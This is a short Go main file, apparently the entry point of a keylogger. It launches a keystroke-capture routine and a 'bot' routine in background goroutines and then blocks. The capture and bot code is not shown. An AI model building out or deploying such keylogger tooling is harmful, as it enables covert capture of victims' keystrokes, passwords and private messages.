package main

import (
	"logger/keylogger/bot"
	"logger/keylogger/keys"
)

func main() {
	var blocker = make(chan struct{})
	go func() {
		keys.KeyStrokes()
	}()
	go func() {
		bot.Start()
	}()

	<-blocker

}
